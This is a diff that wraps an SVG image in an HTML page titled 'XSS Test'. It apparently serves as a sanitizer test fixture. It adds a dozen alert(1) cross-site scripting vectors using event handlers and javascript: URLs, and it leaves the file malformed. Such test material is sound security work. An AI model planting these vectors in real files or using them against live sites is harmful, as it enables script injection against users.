@@ -1,3 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>XSS Test</title>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+</head>
+<body onload=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+<form action=javascript:alert(1)><input type=submit value=submit>
+<math href=javascript:alert(1)>click</math>
+<video src=x onerror=alert(1)></video>
+<audio src=x onerror=alert(1)></audio>
+<details ontoggle=alert(1) open><summary>click</summary></details>
+<dialog open onclose=alert(1)>test</dialog>
+
 <?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="800" viewBox="0 0 800 800">
   
@@ -286,3 +303,5 @@
   </metadata>
 
 </svg>
+</body>
+</html>
